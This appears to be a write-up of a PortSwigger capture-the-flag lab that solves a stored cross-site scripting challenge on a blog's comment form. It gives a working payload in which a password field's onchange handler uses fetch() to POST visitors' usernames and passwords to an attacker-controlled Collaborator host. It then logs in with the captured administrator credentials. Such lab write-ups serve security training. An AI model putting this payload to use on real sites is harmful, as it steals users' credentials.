## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6c464a8b-b305-4f2b-9e6b-f47e18cc9d57)

## Solution :

 We find ourselves back on the target blog page. Navigate your way to your favorite blog and scroll down to view a comment form.

 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b22751af-ab83-4811-a219-249885d16746)

In the comment box insert the following basic HTML input elements. In the password element we will add an event handler, `‘onchange’`, that will trigger our new function. I called our new function, `‘dothis()’`, but can be named whatever you like.

```html
<!-- Creating 2 user input fields -->
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/253c2693-784e-4019-ae55-cd3ed17c357d)

Click ‘Post Comment’ then ‘Back to Blog’ on the next page. Scroll down to view your comment.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/869f3759-3c96-435b-9768-effc74c6596e)

It worked! created <input> fields with `username` and `password`.Now we need to incorporate it into our payload using `Fetch API`.

Payload-

```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://domain.com',
{
method:'POST',
body:username.value+':'+this.value
}
);">
```
This script will make anyone who views the comment issue a POST request containing 
their username and password to your subdomain of the public Collaborator server.

we willl use `burp collaborator` to generate a domain name for us then we use  that domain name in our xss payload.

Go to burp  collaborator window and copy the  collaborator payload ie our domain.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/97bccfce-852f-4f56-a08f-a969dcab0a9b)

Then go and press poll now collaborator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6cbd8495-f9e4-471d-9d50-ddfe7db5cd06)

username =`administrator`
password=`q83be0wmowwmjcrc6th2`

go to my account and login

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d5860823-4cb3-49ce-9790-9d66d200d3cc)

Lab solved.


